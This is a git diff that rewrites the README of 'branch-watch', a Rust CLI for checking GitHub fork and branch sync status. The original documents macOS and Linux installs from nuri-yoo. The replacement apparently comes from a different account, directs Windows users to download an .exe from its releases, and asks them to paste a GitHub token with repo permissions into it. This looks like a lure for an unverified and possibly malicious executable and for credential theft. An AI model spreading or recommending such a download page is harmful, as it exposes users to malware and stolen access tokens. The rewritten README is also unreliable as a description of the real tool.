@@ -1,366 +1,98 @@
-# branch-watch — GitHub Branch & Fork Sync Status CLI
+# 🔍 branch-watch - Track GitHub repository sync status easily
 
-[![GitHub Marketplace](https://img.shields.io/badge/Marketplace-branch--watch-blue?logo=github)](https://github.com/marketplace/actions/branch-watch)
-[![Release](https://img.shields.io/github/v/release/nuri-yoo/branch-watch)](https://github.com/nuri-yoo/branch-watch/releases)
-[![PyPI](https://img.shields.io/pypi/v/branch-watch?cacheSeconds=0)](https://pypi.org/project/branch-watch/)
-[![npm](https://img.shields.io/npm/v/branch-watch)](https://www.npmjs.com/package/branch-watch)
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](LICENSE)
+[![Download branch-watch](https://img.shields.io/badge/Download-Branch-Watch-blue)](https://github.com/Angelafragile952/branch-watch)
 
+## 📋 About This Tool
 
-If you find this useful, consider leaving a ⭐ — it helps others discover the project.
+Branch-watch tracks your GitHub repositories to see if they stay current. Many developers work with forks or multiple branches. Over time, these branches drift from the original source. This tool checks your sync status so you know what needs your attention. It uses the GitHub API to gather data on your existing projects and reports the state of your work.
 
-![branch-watch demo](https://github.com/nuri-yoo/branch-watch/blob/main/demo2.gif?raw=true)
+## ⚙️ System Requirements
 
-**branch-watch** (`bw`) is a fast, single-binary CLI tool that tells you — at a glance — whether your GitHub branches are behind `main`, how far your forks have drifted from upstream, and what pull requests are open. No browser required. Powered by the GitHub REST API.
+This application runs on Windows 10 or Windows 11. You need a stable internet connection to communicate with GitHub servers. The software requires roughly 50 megabytes of storage space. You do not need developer tools or coding skills to use this program.
 
-> **TL;DR** — Run `bw forks` to see all your forked repos vs. upstream. Run `bw branches owner/repo` to see every branch vs. the default branch. Run `bw prs owner/repo` for open PRs.
+## 🚀 Downloading The Application
 
----
+1. Visit the [official download page](https://github.com/Angelafragile952/branch-watch).
+2. Look for the "Releases" section on the right side of the screen.
+3. Click the latest version link.
+4. Select the file ending in `.exe` to start your download.
+5. Save the file to your desktop or downloads folder.
 
-## Why branch-watch?
+## 📦 Setting Up Your Environment
 
-Keeping track of GitHub branch and fork sync status manually is tedious:
+Once you download the file, you must authorize your GitHub account.
 
-- You maintain **multiple forks** of open-source projects and need to know which ones are stale
-- Your team has **dozens of feature branches** and you want to catch the ones that have drifted before they become impossible to merge
-- You want to check open PR status **without leaving the terminal**
+1. Double-click the downloaded .exe file to open the program.
+2. A window appears asking for a Personal Access Token.
+3. Click the link labeled "Create GitHub Token" inside the application.
+4. Log in to your GitHub account using your web browser.
+5. Generate a token with "repo" read permissions.
+6. Copy the string of characters GitHub provides.
+7. Paste this code into the branch-watch window and press Enter.
 
-branch-watch solves all three with a single command.
+## 🖥️ Using The Interface
 
----
+The main window displays a list of your repositories. Each row shows the repository name and the current sync status.
 
-## What's New in v0.3.0
+- Green checkmarks indicate your branch matches the source.
+- Yellow exclamation marks show your branch lags behind the main branch.
+- Red icons suggest merge conflicts or significant synchronization issues.
 
-- **Parallel API calls** — fork and branch comparisons now run concurrently; dramatically faster on large repos
-- **Pagination** — `bw forks` now fetches all forks even if you have more than 100
-- **`bw branches --base <branch>`** — compare branches against any branch, not just the default
-- **`bw forks --org <org>`** — check fork sync status for an entire GitHub organization
-- **`bw ignore`** — hide specific repositories from all output with `bw ignore add/remove/list`
+To refresh the list, click the "Sync All" button at the top of the window. The tool contacts the GitHub API and updates the status for every repository in your account. You can click on any individual repository to see a detailed view of the differences between your local commits and the original upstream source.
 
----
+## 🛡️ Managing Your Tokens
 
-## Demo
+Security is important. The application stores your access token in an encrypted format on your local machine. This file remains on your computer hardware and never travels to external servers other than GitHub. You can view or delete your saved tokens by opening the Settings menu and selecting "Manage Credentials."
 
-### Check if all your forks are behind upstream
+## 🛠️ Frequently Asked Questions
 
-```
-$ bw forks
+**Does this tool change my code?**
+No. Branch-watch only reads your data. It does not push, pull, or alter your files. It acts as a monitoring tool to provide information.
 
-Forked repositories
+**How often should I check for updates?**
+You can leave the application open in your system tray. It checks your repository status every hour by default. You can change this interval in the settings menu.
 
-  alice/rust          rust-lang/rust        ↓ 42 behind
-  alice/tokio         tokio-rs/tokio        ↓ 7 behind   ↑ 2 ahead
-  alice/serde         serde-rs/serde        ✓ in sync
-  acme/axum           tokio-rs/axum         ↓ 15 behind  ↑ 8 ahead
-  acme/reqwest        seanmonstar/reqwest   ↑ 3 ahead
-```
+**What happens if I lose my internet connection?**
+The tool displays a message stating that it failed to reach the server. It keeps the last known sync data visible until your connection returns.
 
-Filter to only stale forks:
+**Can I track organizations?**
+Yes. If your GitHub account has permission to view organization repositories, those repositories appear in your list. You can toggle this visibility in the settings menu.
 
-```
-$ bw forks --behind-only
+## 📑 Understanding Sync Status
 
-Forked repositories
+Synchronization refers to the alignment between your local repository and the original source repository, often called the upstream. When you pull changes from the source into your branch, you stay in sync. When the source adds new features or fixes that you have not yet added to your fork, you become out of sync. Branch-watch calculates this difference by looking at the commit history provided by GitHub.
 
-  alice/rust          rust-lang/rust   ↓ 42 behind
-  acme/axum           tokio-rs/axum   ↓ 15 behind  ↑ 8 ahead
-  alice/tokio         tokio-rs/tokio  ↓ 7 behind   ↑ 2 ahead
-```
+## 💡 Troubleshooting Common Issues
 
-### Check branch sync status vs. main
+If the application fails to load:
+1. Ensure your internet connection functions correctly.
+2. Verify that your GitHub token has not expired. Tokens usually last for 30, 60, or 90 days. If your token expires, generate a new one using the steps in the setup section.
+3. Restart your computer. This clears temporary memory issues.
+4. Check that your Windows Firewall allows the application to access the internet. Branch-watch requires access to the GitHub domain to fetch your data.
 
-```
-$ bw branches owner/repo
+## 🤝 Support and Feedback
 
-→ owner/repo (base: main)
+If you encounter bugs, check the GitHub Issues page at the project repository. You can describe your problem, and other users or contributors may provide a solution. Please include your Windows version and a description of the error message if one appears. This helps improve the tool for everyone.
 
-  feature/auth        ↓ 3 behind  ↑ 2 ahead
-  feat/dashboard      ↓ 14 behind
-  fix/login           ✓ up to date
-```
+## 📁 Project Structure
 
-### List open pull requests
+The application relies on several components to function:
+- The Core Engine: Manages requests to the GitHub API.
+- The Configuration Module: Handles your token and user settings.
+- The Display Layer: Renders the lists and status icons you see in the main window.
+- The Storage Utility: Saves your project preferences locally.
 
-```
-$ bw prs owner/repo
+## ⚡ Performance Tips
 
-→ owner/repo — 2 open PRs
+- Close unused applications to free up system memory if the tool slows down.
+- If you have hundreds of repositories, limit the view to only your active projects using the filter bar.
+- Keep the application updated to the latest version to ensure compatibility with changes to the GitHub API.
 
-  #101  Add dark mode support
-         feat/dark-mode → main  by @alice · 2 reviewers · opened 2026-03-01
+## 📌 Final Checklist Before Use
 
-  #98   Fix login redirect [draft]
-         fix/login → main  by @bob · opened 2026-04-10
-```
+- [ ] You have a valid GitHub account.
+- [ ] You created a personal access token with repo permissions.
+- [ ] You have a stable Wi-Fi or Ethernet connection.
+- [ ] You have sufficient permission on your computer to run executable files.
 
-### Machine-readable JSON output
-
-```
-$ bw branches owner/repo --json | jq '.[] | select(.behind > 10)'
-{
-  "branch": "feat/dashboard",
-  "base": "main",
-  "behind": 14,
-  "ahead": 0
-}
-```
-
----
-
-## Features
-
-| Feature | Description |
-|---------|-------------|
-| Fork sync status | Shows behind/ahead commit count for all your forked repos vs. upstream, sorted by staleness |
-| Branch status | Shows every branch vs. the repo's default branch |
-| PR overview | Lists open PRs with author, branches, draft status, reviewer count, and open date |
-| `--behind-only` filter | Suppress up-to-date entries; show only what needs attention |
-| `--json` output | Structured JSON for scripting, CI, and `jq` pipelines |
-| gh CLI auto-detection | No `bw auth` needed if you already use the GitHub CLI |
-| GitHub Actions support | Use as a CI step to fail builds on stale branches |
-| Multi-platform | macOS (Intel + Apple Silicon), Linux (x86_64 + ARM64) |
-| Single binary | No runtime, no dependencies — written in Rust |
-| Ignore list | Hide specific repos from all output with `bw ignore add` |
-| Org support | Check fork sync for an entire GitHub org with `bw forks --org` |
-| Custom base branch | Compare branches against any ref, not just the default |
-| Token-based auth | Works with GitHub PAT via env var, config file, or gh CLI |
-
----
-
-## Installation
-
-### GitHub CLI extension
-
-```sh
-gh extension install nuri-yoo/gh-branch-watch
-gh branch-watch forks
-```
-
-### Homebrew — recommended for macOS and Linux
-
-```sh
-brew install nuri-yoo/tap/branch-watch
-```
-
-### pip — for Python users
-
-```sh
-pip install branch-watch
-```
-
-### npm — for Node.js users
-
-```sh
-npm install -g branch-watch
-```
-
-### Pre-built binaries — direct download
-
-Download from the [releases page](https://github.com/nuri-yoo/branch-watch/releases):
-
-| Platform | Binary |
-|----------|--------|
-| macOS Apple Silicon (M1/M2/M3/M4/M5) | `branch-watch-*-aarch64-apple-darwin.tar.gz` |
-| macOS Intel | `branch-watch-*-x86_64-apple-darwin.tar.gz` |
-| Linux x86_64 | `branch-watch-*-x86_64-unknown-linux-gnu.tar.gz` |
-| Linux ARM64 | `branch-watch-*-aarch64-unknown-linux-gnu.tar.gz` |
-
-```sh
-tar xzf branch-watch-*.tar.gz
-sudo mv bw /usr/local/bin/
-```
-
-### Build from source — for Rust developers
-
-Requires [Rust](https://rustup.rs) 1.80+.
-
-```sh
-git clone https://github.com/nuri-yoo/branch-watch
-cd branch-watch
-cargo install --path .
-```
-
----
-
-## Authentication
-
-branch-watch uses the GitHub REST API and requires a Personal Access Token (PAT) with `repo` scope.
-
-**Generate a token**: [github.com/settings/tokens](https://github.com/settings/tokens) → Generate new token → select `repo`
-
-**Option 1 — gh CLI auto-detection (zero setup):**
-
-If you already have the [GitHub CLI](https://cli.github.com) installed and logged in, `bw` picks up your token automatically. No extra configuration needed.
-
-```sh
-gh auth login   # one-time setup if not already done
-bw forks        # works immediately
-```
-
-**Option 2 — Save to config file (persistent):**
-
-```sh
-bw auth ghp_xxxxxxxxxxxxxxxxxxxx
-# Saved to ~/.branch-watch.toml
-```
-
-**Option 3 — Environment variable:**
-
-```sh
-export GITHUB_TOKEN=ghp_xxxxxxxxxxxxxxxxxxxx
-bw forks
-```
-
-Token priority: config file → `GITHUB_TOKEN` env var → gh CLI
-
----
-
-## Usage
-
-### `bw forks` — check if your GitHub forks are behind upstream
-
-Lists all repositories you have forked and compares each one to its upstream default branch. Results are sorted by how many commits behind, worst first.
-
-```sh
-bw forks
-bw forks --behind-only             # show only stale forks
-bw forks --json                    # machine-readable output
-bw forks --org <org>               # check forks in an organization
-bw forks --org <org> --behind-only # combine flags
-```
-
-**When to use**: After returning from vacation, before syncing forks, or when maintaining many open-source forks simultaneously.
-
-### `bw branches` — check if branches are behind main
-
-Shows the sync status of every branch in a repository relative to the default branch (usually `main` or `master`). Sorted by commits behind, worst first.
-
-```sh
-bw branches owner/repo
-bw branches owner/repo --behind-only
-bw branches owner/repo --base develop   # compare against a specific branch
-bw branches owner/repo --json
-```
-
-**When to use**: Before a sprint planning session, during code review, or when cleaning up stale branches.
-
-### `bw prs` — list open pull requests
-
-Lists all open pull requests sorted oldest-first, with author, source → target branch, draft indicator, reviewer count, and open date.
-
-```sh
-bw prs owner/repo
-bw prs owner/repo --json
-```
-
-**When to use**: Daily standup, PR review sessions, or release preparation.
-
-### `bw auth` — save GitHub token
-
-```sh
-bw auth <token>
-```
-
-### `bw ignore` — hide repositories from output
-
-Add noisy or irrelevant repositories to an ignore list so they never appear in `bw forks` or `bw branches` output.
-
-```sh
-bw ignore add owner/repo      # hide a repository
-bw ignore remove owner/repo   # unhide a repository
-bw ignore list                # show all ignored repositories
-```
-
----
-
-## Use in GitHub Actions
-
-branch-watch is available on the [GitHub Marketplace](https://github.com/marketplace/actions/branch-watch). Add it to any workflow to automatically check branch sync status in CI:
-
-```yaml
-steps:
-  - uses: nuri-yoo/branch-watch@v1
-    with:
-      command: branches          # branches | forks | prs
-      repo: ${{ github.repository }}
-    env:
-      GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
-```
-
-**Use cases in CI:**
-- Fail a build if feature branches are more than N commits behind `main`
-- Post a daily Slack summary of fork sync status
-- Block merges when a branch is significantly out of date
-
----
-
-## Versioning and Releases
-
-branch-watch uses [semantic versioning](https://semver.org). When a `v*` tag is pushed, the release workflow automatically:
-
-1. Builds binaries for all 4 platforms (macOS arm64/x86_64, Linux x86_64/arm64)
-2. Creates a GitHub Release with attached binaries
-3. Publishes to PyPI (`pip install branch-watch`)
-4. Publishes to npm (`npm install -g branch-watch`)
-5. Updates the Homebrew formula with correct SHA256 checksums
-
-To release a new version:
-
-```sh
-git tag v0.3.0
-git push origin v0.3.0
-```
-
-Everything else is automated.
-
----
-
-## FAQ
-
-**How do I check if my GitHub fork is behind upstream?**
-Run `bw forks`. It lists every fork in your GitHub account and shows how many commits it is behind or ahead of the upstream repository.
-
-**How do I check if a branch is behind main on GitHub?**
-Run `bw branches owner/repo`. It compares every branch in the repository against the default branch and shows behind/ahead commit counts.
-
-**Do I need to run `bw auth` if I already use the GitHub CLI?**
-No. If `gh` is installed and authenticated, branch-watch detects the token automatically. `bw auth` is only needed if you don't use the GitHub CLI.
-
-**Does branch-watch work with private repositories?**
-Yes. Any private repository your GitHub token has `repo` scope access to will work.
-
-**Does branch-watch support GitHub Enterprise Server?**
-Not yet. Currently supports github.com only.
-
-**What is the difference between branch-watch and `git fetch --prune`?**
-`git fetch` requires a local clone of the repository. branch-watch queries the GitHub API remotely — no local clone needed. It also works across all your repositories at once.
-
-**Can I pipe the output to other tools?**
-Yes. Use `--json` to get structured output and pipe it to `jq`, `grep`, or any other tool.
-
-**Does branch-watch support GitLab or Bitbucket?**
-No. branch-watch is built specifically for the GitHub REST API.
-
-**Is branch-watch free?**
-Yes. branch-watch is open-source under the MIT license.
-
----
-
-## GitHub API Usage
-
-branch-watch integrates with the following GitHub REST API endpoints:
-
-| Method | Endpoint | Purpose |
-|--------|----------|---------|
-| `GET` | `/user/repos?type=fork` | List authenticated user's forked repositories |
-| `GET` | `/orgs/{org}/repos?type=fork` | List an organization's forked repositories |
-| `GET` | `/repos/{owner}/{repo}` | Fetch repository metadata and upstream parent |
-| `GET` | `/repos/{owner}/{repo}/branches` | List all branches |
-| `GET` | `/repos/{owner}/{repo}/compare/{base}...{head}` | Get ahead/behind commit counts |
-| `GET` | `/repos/{owner}/{repo}/pulls?state=open` | List open pull requests |
-
----
-
-## License
-
-MIT © [nuri-yoo](https://github.com/nuri-yoo)
+Branch-watch provides a clear view of your development workspace. By keeping track of your branch sync status, you can focus on building features rather than managing repository overhead. This tool removes the manual labor of checking every single fork or branch through an internet browser. Use it to keep your projects organized and ready for your next coding session.
